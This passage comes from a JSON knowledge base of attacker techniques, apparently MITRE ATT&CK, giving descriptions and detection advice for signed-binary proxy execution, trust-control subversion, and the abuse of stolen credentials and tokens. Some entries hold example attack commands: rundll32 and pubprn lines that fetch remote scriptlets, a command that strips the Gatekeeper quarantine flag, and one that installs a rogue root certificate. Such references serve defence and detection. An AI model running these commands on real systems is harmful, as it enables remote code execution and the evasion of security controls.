        "description": " \nAdversaries may abuse Regsvr32.exe to proxy execution of malicious code. Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. Regsvr32.exe is also a Microsoft signed binary.  \n\nMalicious usage of Regsvr32.exe may avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of allowlists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe can also be used to specifically bypass application control using functionality to load COM scriptlets to execute DLLs under user permissions. Since Regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed.  \nThis variation of the technique is often referred to as a \"Squiblydoo\" attack and has been used in campaigns targeting governments.  \n  \n\nRegsvr32.exe can also be leveraged to register a COM Object used to establish persistence via  Component Object Model Hijacking .  \n ",
        "detection": "\nUse process monitoring to monitor the execution and arguments of regsvr32.exe. Compare recent invocations of regsvr32.exe with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity. Command arguments used before and after the regsvr32.exe invocation may also be useful in determining the origin and purpose of the script or DLL being loaded.  \n\n"
      },
      "T1218.011": {
        "name": "Rundll32",
        "description": " \nAdversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e.  Shared Modules ), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads. \nRundll32.exe can also be used to execute  Control Panel Item files (.cpl) through the undocumented shell32.dll functions  Control_RunDLL and  Control_RunDLLAsUser . Double-clicking a .cpl file also causes rundll32.exe to execute.  \n\nRundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this:  rundll32.exe javascript:\"..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\" This behavior has been seen used by malware such as Poweliks.  \n ",
        "detection": "\nUse process monitoring to monitor the execution and arguments of rundll32.exe. Compare recent invocations of rundll32.exe with prior history of known good arguments and loaded DLLs to determine anomalous and potentially adversarial activity. Command arguments used with the rundll32.exe invocation may also be useful in determining the origin and purpose of the DLL being loaded.\n\n"
      },
      "T1218.012": {
        "name": "Verclsid",
        "description": " \nAdversaries may abuse verclsid.exe to proxy execution of malicious code. Verclsid.exe is known as the Extension CLSID Verification Host and is responsible for verifying each shell extension before they are used by Windows Explorer or the Windows Shell.  \n\nAdversaries may abuse verclsid.exe to execute malicious payloads. This may be achieved by running  verclsid.exe /S /C {{CLSID}} , where the file is referenced by a Class ID (CLSID), a unique identification number used to identify COM objects. COM payloads executed by verclsid.exe may be able to perform various malicious actions, such as loading and executing COM scriptlets (SCT) from remote servers (similar to  Regsvr32 ). Since it is signed and native on Windows systems, proxying execution via verclsid.exe may bypass application control solutions that do not account for its potential abuse.  \n \n \n \n  ",
        "detection": "\nUse process monitoring to monitor the execution and arguments of verclsid.exe. Compare recent invocations of verclsid.exe with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity. Command arguments used before and after the invocation of verclsid.exe may also be useful in determining the origin and purpose of the payload being executed. Depending on the environment, it may be unusual for verclsid.exe to have a parent process of a Microsoft Office product. It may also be unusual for verclsid.exe to have any child processes or to make network connections or file modifications.\n\n"
      },
      "T1216": {
        "name": "Signed Script Proxy Execution",
        "description": " \nAdversaries may use scripts signed with trusted certificates to proxy execution of malicious files. Several Microsoft signed scripts that are default on Windows installations can be used to proxy execution of other files. This behavior may be abused by adversaries to execute malicious files that could bypass application control and signature validation on systems.  \n ",
        "detection": "\nMonitor script processes, such as cscript, and command-line parameters for scripts like PubPrn.vbs that may be used to proxy execution of malicious files.\n\n"
      },
      "T1216.001": {
        "name": "PubPrn",
        "description": " \nAdversaries may use the trusted PubPrn script to proxy execution of malicious files. This behavior may bypass signature validation restrictions and application control solutions that do not account for use of these scripts. \n PubPrn.vbs is a Visual Basic script that publishes a printer to Active Directory Domain Services. The script is signed by Microsoft and can be used to proxy execution from a remote site.  \nAn example command is  cscript C[:]\\Windows\\System32\\Printing_Admin_Scripts\\en-US\\pubprn[.]vbs 127.0.0.1 script:http[:]//192.168.1.100/hi.png .  ",
        "detection": "\nMonitor script processes, such as cscript, and command-line parameters for scripts like PubPrn.vbs that may be used to proxy execution of malicious files.\n\n"
      },
      "T1553": {
        "name": "Subvert Trust Controls",
        "description": " \nAdversaries may undermine security controls that will either warn users of untrusted activity or prevent execution of untrusted programs. Operating systems and security products may contain mechanisms to identify programs or websites as possessing some level of trust. Examples of such features would include a program being allowed to run because it is signed by a valid code signing certificate, a program prompting the user with a warning because it has an attribute set from being downloaded from the Internet, or getting an indication that you are about to connect to an untrusted site. \nAdversaries may attempt to subvert these trust mechanisms. The method adversaries use will depend on the specific mechanism they seek to subvert. Adversaries may conduct  File and Directory Permissions Modification or  Modify Registry in support of subverting these controls.  \nAdversaries may also create or steal code signing certificates to acquire trust on target systems.  \n \n  ",
        "detection": "\nCollect and analyze signing certificate metadata on software that executes within the environment to look for unusual certificate characteristics and outliers. Periodically baseline registered SIPs and trust providers (Registry entries and files on disk), specifically looking for new, modified, or non-Microsoft entries.   A system's root certificates are unlikely to change frequently. Monitor new certificates installed on a system that could be due to malicious activity. Analyze Autoruns data for oddities and anomalies, specifically malicious files attempting persistent execution by hiding within auto-starting locations. Autoruns will hide entries signed by Microsoft or Windows by default, so ensure \"Hide Microsoft Entries\" and \"Hide Windows Entries\" are both deselected.  Monitor and investigate attempts to modify extended file attributes with utilities such as xattr. Built-in system utilities may generate high false positive alerts, so compare against baseline knowledge for how systems are typically used and correlate modification events with other indications of malicious activity where possible. \n\n"
      },
      "T1553.001": {
        "name": "Gatekeeper Bypass",
        "description": " \nAdversaries may modify file attributes that signify programs are from untrusted sources to subvert Gatekeeper controls. In macOS and OS X, when applications or programs are downloaded from the internet, there is a special attribute set on the file called  com.apple.quarantine . This attribute is read by Apple's Gatekeeper defense program at execution time and provides a prompt to the user to allow or deny execution. \nApps loaded onto the system from USB flash drive, optical disk, external hard drive, or even from a drive shared over the local network won’t set this flag. Additionally, it is possible to avoid setting this flag using  Drive-by Compromise . This completely bypasses the built-in Gatekeeper check.  \nThe presence of the quarantine flag can be checked by the xattr command  xattr /path/to/MyApp.app for  com.apple.quarantine . Similarly, given sudo access or elevated permission, this attribute can be removed with xattr as well,  sudo xattr -r -d com.apple.quarantine /path/to/MyApp.app .  \n  \n\nIn typical operation, a file will be downloaded from the internet and given a quarantine flag before being saved to disk. When the user tries to open the file or application, macOS’s gatekeeper will step in and check for the presence of this flag. If it exists, then macOS will then prompt the user to confirmation that they want to run the program and will even provide the URL where the application came from. However, this is all based on the file being downloaded from a quarantine-savvy application.  \n ",
        "detection": "\nMonitoring for the removal of the com.apple.quarantine flag by a user instead of the operating system is a suspicious action and should be examined further. Monitor and investigate attempts to modify extended file attributes with utilities such as xattr. Built-in system utilities may generate high false positive alerts, so compare against baseline knowledge for how systems are typically used and correlate modification events with other indications of malicious activity where possible.\n\n"
      },
      "T1553.002": {
        "name": "Code Signing",
        "description": " \nAdversaries may create, acquire, or steal code signing materials to sign their malware or tools. Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with.  \nThe certificates used during an operation may be created, acquired, or stolen by the adversary.  \n  \nUnlike  Invalid Code Signature , this activity will result in a valid signature. \nCode signing to verify software on first run can be used on modern Windows and macOS/OS X systems. It is not used on Linux due to the decentralized nature of the platform.  \n \nCode signing certificates may be used to bypass security policies that require signed code to execute on a system.  ",
        "detection": "\nCollect and analyze signing certificate metadata on software that executes within the environment to look for unusual certificate characteristics and outliers.\n\n"
      },
      "T1553.003": {
        "name": "SIP and Trust Provider Hijacking",
        "description": " \nAdversaries may tamper with SIP and trust provider components to mislead the operating system and application control tools when conducting signature validation checks. In user mode, Windows Authenticode  \ndigital signatures are used to verify a file's origin and integrity, variables that may be used to establish trust in signed code (ex: a driver with a valid Microsoft signature may be handled as safe). The signature validation process is handled via the WinVerifyTrust application programming interface (API) function,  \nwhich accepts an inquiry and coordinates with the appropriate trust provider, which is responsible for validating parameters of a signature.  \n\nBecause of the varying executable file types and corresponding signature formats, Microsoft created software components called Subject Interface Packages (SIPs)  \nto provide a layer of abstraction between API functions and files. SIPs are responsible for enabling API functions to create, retrieve, calculate, and verify signatures. Unique SIPs exist for most file formats (Executable, PowerShell, Installer, etc., with catalog signing providing a catch-all  \n) and are identified by globally unique identifiers (GUIDs).  \n\nSimilar to  Code Signing , adversaries may abuse this architecture to subvert trust controls and bypass security policies that allow only legitimately signed code to execute on a system. Adversaries may hijack SIP and trust provider components to mislead operating system and application control tools to classify malicious (or any) code as signed by:  \nModifying the  Dll and  FuncName Registry values in  HKLM\\SOFTWARE[\\WOW6432Node]Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllGetSignedDataMsg{{SIP_GUID}} that point to the dynamic link library (DLL) providing a SIP’s CryptSIPDllGetSignedDataMsg function, which retrieves an encoded digital certificate from a signed file. By pointing to a maliciously-crafted DLL with an exported function that always returns a known good signature value (ex: a Microsoft signature for Portable Executables) rather than the file’s real signature, an adversary can apply an acceptable signature value to all files using that SIP  \n(although a hash mismatch will likely occur, invalidating the signature, since the hash returned by the function will not match the value computed from the file). Modifying the  Dll and  FuncName Registry values in  HKLM\\SOFTWARE[WOW6432Node]Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllVerifyIndirectData{{SIP_GUID}} that point to the DLL providing a SIP’s CryptSIPDllVerifyIndirectData function, which validates a file’s computed hash against the signed hash value. By pointing to a maliciously-crafted DLL with an exported function that always returns TRUE (indicating that the validation was successful), an adversary can successfully validate any file (with a legitimate signature) using that SIP  \n(with or without hijacking the previously mentioned CryptSIPDllGetSignedDataMsg function). This Registry value could also be redirected to a suitable exported function from an already present DLL, avoiding the requirement to drop and execute a new file on disk. Modifying the  DLL and  Function Registry values in  HKLM\\SOFTWARE[WOW6432Node]Microsoft\\Cryptography\\Providers\\Trust\\FinalPolicy{{trust provider GUID}} that point to the DLL providing a trust provider’s FinalPolicy function, which is where the decoded and parsed signature is checked and the majority of trust decisions are made. Similar to hijacking SIP’s CryptSIPDllVerifyIndirectData function, this value can be redirected to a suitable exported function from an already present DLL or a maliciously-crafted DLL (though the implementation of a trust provider is complex).  Note: The above hijacks are also possible without modifying the Registry via  DLL Search Order Hijacking . \nHijacking SIP or trust provider components can also enable persistent code execution, since these malicious components may be invoked by any application that performs code signing or signature validation.  \n ",
        "detection": "\nPeriodically baseline registered SIPs and trust providers (Registry entries and files on disk), specifically looking for new, modified, or non-Microsoft entries.  Enable CryptoAPI v2 (CAPI) event logging   to monitor and analyze error events related to failed trust validation (Event ID 81, though this event can be subverted by hijacked trust provider components) as well as any other provided information events (ex: successful validations). Code Integrity event logging may also provide valuable indicators of malicious SIP or trust provider loads, since protected processes that attempt to load a maliciously-crafted trust validation component will likely fail (Event ID 3033).  Utilize Sysmon detection rules and/or enable the Registry (Global Object Access Auditing)   setting in the Advanced Security Audit policy to apply a global system access control list (SACL) and event auditing on modifications to Registry values (sub)keys related to SIPs and trust providers:  HKLM\\SOFTWARE\\Microsoft\\Cryptography\\OIDHKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Cryptography\\OIDHKLM\\SOFTWARE\\Microsoft\\Cryptography\\Providers\\TrustHKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Cryptography\\Providers\\TrustNote: As part of this technique, adversaries may attempt to manually edit these Registry keys (ex: Regedit) or utilize the legitimate registration process using Regsvr32.  Analyze Autoruns data for oddities and anomalies, specifically malicious files attempting persistent execution by hiding within auto-starting locations. Autoruns will hide entries signed by Microsoft or Windows by default, so ensure \"Hide Microsoft Entries\" and \"Hide Windows Entries\" are both deselected.  \n\n"
      },
      "T1553.004": {
        "name": "Install Root Certificate",
        "description": " \nAdversaries may install a root certificate on a compromised system to avoid warnings when connecting to adversary controlled web servers. Root certificates are used in public key cryptography to identify a root certificate authority (CA). When a root certificate is installed, the system or application will trust certificates in the root's chain of trust that have been signed by the root certificate.  \nCertificates are commonly used for establishing secure TLS/SSL communications within a web browser. When a user attempts to browse a website that presents a certificate that is not trusted an error message will be displayed to warn the user of the security risk. Depending on the security settings, the browser may not allow the user to establish a connection to the website. \nInstallation of a root certificate on a compromised system would give an adversary a way to degrade the security of that system. Adversaries have used this technique to avoid security warnings prompting users when compromised systems connect over HTTPS to adversary controlled web servers that spoof legitimate websites in order to collect login credentials.  \n\nAtypical root certificates have also been pre-installed on systems by the manufacturer or in the software supply chain and were used in conjunction with malware/adware to provide a man-in-the-middle capability for intercepting information transmitted over secure TLS/SSL communications.  \n\nRoot certificates (and their associated chains) can also be cloned and reinstalled. Cloned certificate chains will carry many of the same metadata characteristics of the source and can be used to sign malicious code that may then bypass signature validation tools (ex: Sysinternals, antivirus, etc.) used to block execution and/or uncover artifacts of Persistence.  \n\nIn macOS, the Ay MaMi malware uses  /usr/bin/security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /path/to/malicious/cert to install a malicious certificate as a trusted root certificate into the system keychain.  \n ",
        "detection": "\nA system's root certificates are unlikely to change frequently. Monitor new certificates installed on a system that could be due to malicious activity.   Check pre-installed certificates on new systems to ensure unnecessary or suspicious certificates are not present. Microsoft provides a list of trustworthy root certificates online and through authroot.stl.   The Sysinternals Sigcheck utility can also be used (sigcheck .exe -tuv) to dump the contents of the certificate store and list valid certificates not rooted to the Microsoft Certificate Trust List.  Installed root certificates are located in the Registry under HKLM\\SOFTWARE\\Microsoft\\EnterpriseCertificates\\Root\\Certificates\\ and [HKLM or HKCU]\\Software[\\Policies]\\Microsoft\\SystemCertificates\\Root\\Certificates\\. There are a subset of root certificates that are consistent across Windows systems and can be used for comparison:  18F7C1FCC3090203FD5BAA2F861A754976C8DD25245C97DF7514E7CF2DF8BE72AE957B9E04741E853B1EFD3A66EA28B16697394703A72CA340A05BD57F88CD7223F3C813818C994614A89C99FA3B52478F43288AD272F3103B6FB1428485EA3014C0BCFEA43489159A520F0D93D032CCAF37E7FE20A8B419BE36A4562FB2EE05DBB3D32323ADF445084ED656CDD4EEAE6000AC7F40C3802C171E30148030C072\n\n"
      },
      "T1221": {
        "name": "Template Injection",
        "description": " \nAdversaries may create or modify references in Office document templates to conceal malicious code or force authentication attempts. Microsoft’s Office Open XML (OOXML) specification defines an XML-based format for Office documents (.docx, xlsx, .pptx) to replace older binary formats (.doc, .xls, .ppt). OOXML files are packed together ZIP archives compromised of various XML files, referred to as parts, containing properties that collectively define how a document is rendered.  \n\nProperties within parts may reference shared public resources accessed via online URLs. For example, template properties reference a file, serving as a pre-formatted document blueprint, that is fetched when the document is loaded. \nAdversaries may abuse this technology to initially conceal malicious code to be executed via documents. Template references injected into a document may enable malicious payloads to be fetched and executed when the document is loaded.  \nThese documents can be delivered via other techniques such as  Phishing and/or  Taint Shared Content and may evade static detections since no typical indicators (VBA macro, script, etc.) are present until after the malicious payload is fetched.  \nExamples have been seen in the wild where template injection was used to load malicious code containing an exploit.  \n\nThis technique may also enable  Forced Authentication by injecting a SMB/HTTPS (or other credential prompting) URL and triggering an authentication attempt.  \n  \n  \n ",
        "detection": "\nAnalyze process behavior to determine if an Office application is performing actions, such as opening network connections, reading files, spawning abnormal child processes (ex: PowerShell), or other suspicious actions that could relate to post-compromise behavior.\n\n"
      },
      "T1205": {
        "name": "Traffic Signaling",
        "description": " \nAdversaries may use traffic signaling to hide open ports or other malicious functionality used for persistence or command and control. Traffic signaling involves the use of a magic value or sequence that must be sent to a system to trigger a special response, such as opening a closed port or executing a malicious task. This may take the form of sending a series of packets with certain characteristics before a port will be opened that the adversary can use for command and control. Usually this series of packets consists of attempted connections to a predefined sequence of closed ports (i.e.  Port Knocking ), but can involve unusual flags, specific strings, or other unique characteristics. After the sequence is completed, opening a port may be accomplished by the host-based firewall, but could also be implemented by custom software. \nAdversaries may also communicate with an already open port, but the service listening on that port will only respond to commands or trigger other malicious functionality if passed the appropriate magic value(s). \nThe observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r  \n, is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs. \nOn network devices, adversaries may use crafted packets to enable  Network Device Authentication for standard services offered by the device such as telnet.  Such signaling may also be used to open a closed service port such as telnet, or to trigger module modification of malware implants on the device, adding, removing, or changing malicious capabilities.  \n  \n  \nTo enable this traffic signaling on embedded devices, adversaries must first achieve and leverage  Patch System Image due to the monolithic nature of the architecture.  ",
        "detection": "\nRecord network packets sent to and from the system, looking for extraneous packets that do not belong to established flows.\n\n"
      },
      "T1205.001": {
        "name": "Port Knocking",
        "description": " \nAdversaries may use port knocking to hide open ports used for persistence or command and control. To enable a port, an adversary sends a series of attempted connections to a predefined sequence of closed ports. After the sequence is completed, opening a port is often accomplished by the host based firewall, but could also be implemented by custom software. \nThis technique has been observed to both for the dynamic opening of a listening port as well as the initiating of a connection to a listening server on a different system. \nThe observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r  \n, is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.  ",
        "detection": "\nRecord network packets sent to and from the system, looking for extraneous packets that do not belong to established flows.\n\n"
      },
      "T1127": {
        "name": "Trusted Developer Utilities Proxy Execution",
        "description": " \nAdversaries may take advantage of trusted developer utilities to proxy execution of malicious payloads. There are many utilities used for software development related tasks that can be used to execute code in various forms to assist in development, debugging, and reverse engineering.  \n \n \n \nThese utilities may often be signed with legitimate certificates that allow them to execute on a system and proxy execution of malicious code through a trusted process that effectively bypasses application control solutions.  ",
        "detection": "\nMonitor for abnormal presence of these or other utilities that enable proxy execution that are typically used for development, debugging, and reverse engineering on a system that is not used for these purposes may be suspicious.Use process monitoring to monitor the execution and arguments of from developer utilities that may be abused. Compare recent invocations of those binaries with prior history of known good arguments and executed binaries to determine anomalous and potentially adversarial activity. It is likely that these utilities will be used by software developers or for other software development related tasks, so if it exists and is used outside of that context, then the event may be suspicious. Command arguments used before and after invocation of the utilities may also be useful in determining the origin and purpose of the binary being executed.\n\n"
      },
      "T1127.001": {
        "name": "MSBuild",
        "description": " \nAdversaries may use MSBuild to proxy execution of code through a trusted Windows utility. MSBuild.exe (Microsoft Build Engine) is a software build platform used by Visual Studio. It handles XML formatted project files that define requirements for loading and building various platforms and configurations.  \n\nAdversaries can abuse MSBuild to proxy execution of malicious code. The inline task capability of MSBuild that was introduced in .NET version 4 allows for C# code to be inserted into an XML project file.  \nMSBuild will compile and execute the inline task. MSBuild.exe is a signed Microsoft binary, so when it is used this way it can execute arbitrary code and bypass application control defenses that are configured to allow MSBuild.exe execution.  \n ",
        "detection": "\nUse process monitoring to monitor the execution and arguments of MSBuild.exe. Compare recent invocations of those binaries with prior history of known good arguments and executed binaries to determine anomalous and potentially adversarial activity. Command arguments used before and after invocation of the utilities may also be useful in determining the origin and purpose of the binary being executed.\n\n"
      },
      "T1535": {
        "name": "Unused/Unsupported Cloud Regions",
        "description": " \nAdversaries may create cloud instances in unused geographic service regions in order to evade detection. Access is usually obtained through compromising accounts used to manage cloud infrastructure. \nCloud service providers often provide infrastructure throughout the world in order to improve performance, provide redundancy, and allow customers to meet compliance requirements. Oftentimes, a customer will only use a subset of the available regions and may not actively monitor other regions. If an adversary creates resources in an unused region, they may be able to operate undetected. \nA variation on this behavior takes advantage of differences in functionality across cloud regions. An adversary could utilize regions which do not support advanced detection services in order to avoid detection of their activity. For example, AWS GuardDuty is not supported in every region.  \n\nAn example of adversary use of unused AWS regions is to mine cryptocurrency through  Resource Hijacking , which can cost organizations substantial amounts of money over time depending on the processing power used.  \n ",
        "detection": "\nMonitor system logs to review activities occurring across all cloud environments and regions. Configure alerting to notify of activity in normally unused regions or if the number of instances active in a region goes above a certain threshold. \n\n"
      },
      "T1550": {
        "name": "Use Alternate Authentication Material",
        "description": " \nAdversaries may use alternate authentication material, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls. \nAuthentication processes generally require a valid identity (e.g., username) along with one or more authentication factors (e.g., password, pin, physical smart card, token generator, etc.). Alternate authentication material is legitimately generated by systems after a user or application successfully authenticates by providing a valid identity and the required authentication factor(s). Alternate authentication material may also be generated during the identity creation process.  \n \n\nCaching alternate authentication material allows the system to verify an identity has successfully authenticated without asking the user to reenter authentication factor(s). Because the alternate authentication must be maintained by the system—either in memory or on disk—it may be at risk of being stolen through  Credential Access techniques. By stealing alternate authentication material, adversaries are able to bypass system access controls and authenticate to systems without knowing the plaintext password or any additional authentication factors.  ",
        "detection": "\nConfigure robust, consistent account activity audit policies across the enterprise and with externally accessible services.  Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).\n\n"
      },
      "T1550.001": {
        "name": "Application Access Token",
        "description": " \nAdversaries may use stolen application access tokens to bypass the typical authentication process and access restricted accounts, information, or services on remote systems. These tokens are typically stolen from users and used in lieu of login credentials. \nApplication access tokens are used to make authorized API requests on behalf of a user and are commonly used as a way to access resources in cloud-based applications and software-as-a-service (SaaS).  \nOAuth is one commonly implemented framework that issues tokens to users for access to systems. These frameworks are used collaboratively to verify the user and determine what actions the user is allowed to perform. Once identity is established, the token allows actions to be authorized, without passing the actual credentials of the user. Therefore, compromise of the token can grant the adversary access to resources of other sites through a malicious application.  \n\nFor example, with a cloud-based email service once an OAuth access token is granted to a malicious application, it can potentially gain long-term access to features of the user account if a \"refresh\" token enabling background access is awarded.  \nWith an OAuth access token an adversary can use the user-granted REST API to perform functions such as email searching and contact enumeration.  \n\nCompromised access tokens may be used as an initial step in compromising other services. For example, if a token grants access to a victim’s primary email, the adversary may be able to extend access to all other services which the target subscribes by triggering forgotten password routines. Direct API access through a token negates the effectiveness of a second authentication factor and may be immune to intuitive countermeasures like changing passwords. Access abuse over an API channel can be difficult to detect even from the service provider end, as the access can still align well with a legitimate workflow.  ",
        "detection": "\nMonitor access token activity for abnormal use and permissions granted to unusual or suspicious applications and APIs.\n\n"
      },
      "T1550.002": {
        "name": "Pass the Hash",
        "description": " \nAdversaries may \"pass the hash\" using stolen password hashes to move laterally within an environment, bypassing normal system access controls. Pass the hash (PtH) is a method of authenticating as a user without having access to the user's cleartext password. This method bypasses standard authentication steps that require a cleartext password, moving directly into the portion of the authentication that uses the password hash. In this technique, valid password hashes for the account being used are captured using a Credential Access technique. Captured hashes are used with PtH to authenticate as that user. Once authenticated, PtH may be used to perform actions on local or remote systems. \nWindows 7 and higher with KB2871997 require valid domain user credentials or RID 500 administrator hashes.  \n ",
        "detection": "\nAudit all logon and credential use events and review for discrepancies. Unusual remote logins that correlate with other suspicious activity (such as writing and executing binaries) may indicate malicious activity. NTLM LogonType 3 authentications that are not associated to a domain login and are not anonymous logins are suspicious.\n\n"
      },
      "T1550.003": {
        "name": "Pass the Ticket",
        "description": " \nAdversaries may \"pass the ticket\" using stolen Kerberos tickets to move laterally within an environment, bypassing normal system access controls. Pass the ticket (PtT) is a method of authenticating to a system using Kerberos tickets without having access to an account's password. Kerberos authentication can be used as the first step to lateral movement to a remote system. \nIn this technique, valid Kerberos tickets for  Valid Accounts are captured by  OS Credential Dumping . A user's service tickets or ticket granting ticket (TGT) may be obtained, depending on the level of access. A service ticket allows for access to a particular resource, whereas a TGT can be used to request service tickets from the Ticket Granting Service (TGS) to access any resource the user has privileges to access.  \n \n\n Silver Ticket can be obtained for services that use Kerberos as an authentication mechanism and are used to generate tickets to access that particular resource and the system that hosts the resource (e.g., SharePoint).  \n\n Golden Ticket can be obtained for the domain using the Key Distribution Service account KRBTGT account NTLM hash, which enables generation of TGTs for any account in Active Directory.  \n ",
        "detection": "\nAudit all Kerberos authentication and credential use events and review for discrepancies. Unusual remote authentication events that correlate with other suspicious activity (such as writing and executing binaries) may indicate malicious activity.Event ID 4769 is generated on the Domain Controller when using a golden ticket after the KRBTGT password has been reset twice, as mentioned in the mitigation section. The status code 0x1F indicates the action has failed due to \"Integrity check on decrypted field failed\" and indicates misuse by a previously invalidated golden ticket. \n\n"
      },
      "T1550.004": {
        "name": "Web Session Cookie",
        "description": " \nAdversaries can use stolen session cookies to authenticate to web applications and services. This technique bypasses some multi-factor authentication protocols since the session is already authenticated.  \n\nAuthentication cookies are commonly used in web applications, including cloud-based services, after a user has authenticated to the service so credentials are not passed and re-authentication does not need to occur as frequently. Cookies are often valid for an extended period of time, even if the web application is not actively used. After the cookie is obtained through  Steal Web Session Cookie , the adversary may then import the cookie into a browser they control and is then able to use the site or application as the user for as long as the session cookie is active. Once logged into the site, an adversary can access sensitive information, read email, or perform actions that the victim account has permissions to perform. \nThere have been examples of malware targeting session cookies to bypass multi-factor authentication systems.  \n ",
        "detection": "\nMonitor for anomalous access of websites and cloud-based applications by the same user in different locations or by different systems that do not match expected configurations.\n\n"
      },
      "T1078": {
        "name": "Valid Accounts",
        "description": " \nAdversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop. Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence. \nThe overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.  \n ",
        "detection": "\nConfigure robust, consistent account activity audit policies across the enterprise and with externally accessible services.   Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).Perform regular audits of domain and local system accounts to detect accounts that may have been created by an adversary for persistence. Checks on these accounts could also include whether default accounts such as Guest have been activated. These audits should also include checks on any appliances and applications for default credentials or SSH keys, and if any are discovered, they should be updated immediately.\n\n"
      },
      "T1078.001": {
        "name": "Default Accounts",
        "description": " \nAdversaries may obtain and abuse credentials of a default account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Default accounts are those that are built-into an OS, such as the Guest or Administrator accounts on Windows systems or default factory/provider set accounts on other types of systems, software, or devices.  \n\nDefault accounts are not limited to client machines, rather also include accounts that are preset for equipment such as network devices and computer applications whether they are internal, open source, or commercial. Appliances that come preset with a username and password combination pose a serious threat to organizations that do not change it post installation, as they are easy targets for an adversary. Similarly, adversaries may also utilize publicly disclosed or stolen  Private Keys or credential materials to legitimately connect to remote environments via  Remote Services .  \n ",
        "detection": "\nMonitor whether default accounts have been activated or logged into. These audits should also include checks on any appliances and applications for default credentials or SSH keys, and if any are discovered, they should be updated immediately.\n\n"
      },
      "T1078.002": {
        "name": "Domain Accounts",
        "description": " \nAdversaries may obtain and abuse credentials of a domain account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion.  \nDomain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover users, administrators, and services.  \n\nAdversaries may compromise domain accounts, some with a high level of privileges, through various means such as  OS Credential Dumping or password reuse, allowing access to privileged resources of the domain.  ",
        "detection": "\nConfigure robust, consistent account activity audit policies across the enterprise and with externally accessible services.  Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).Perform regular audits of domain accounts to detect accounts that may have been created by an adversary for persistence.\n\n"
      },
      "T1078.003": {
        "name": "Local Accounts",
        "description": " \nAdversaries may obtain and abuse credentials of a local account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service. \nLocal Accounts may also be abused to elevate privileges and harvest credentials through  OS Credential Dumping . Password reuse may allow the abuse of local accounts across a set of machines on a network for the purposes of Privilege Escalation and Lateral Movement.  ",
        "detection": "\nPerform regular audits of local system accounts to detect accounts that may have been created by an adversary for persistence. Look for suspicious account behavior, such as accounts logged in at odd times or outside of business hours.\n\n"
      },
      "T1078.004": {
        "name": "Cloud Accounts",
        "description": " \nAdversaries may obtain and abuse credentials of a cloud account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application. In some cases, cloud accounts may be federated with traditional identity management system, such as Window Active Directory.  \n \n \n\nCompromised credentials for cloud accounts can be used to harvest sensitive data from online storage accounts and databases. Access to cloud accounts can also be abused to gain Initial Access to a network by abusing a  Trusted Relationship . Similar to  Domain Accounts , compromise of federated cloud accounts may allow adversaries to more easily move laterally within an environment.  ",
        "detection": "\nMonitor the activity of cloud accounts to detect abnormal or malicious behavior, such as accessing information outside of the normal function of the account or account usage at atypical hours.\n\n"
      },
      "T1497": {
        "name": "Virtualization/Sandbox Evasion",
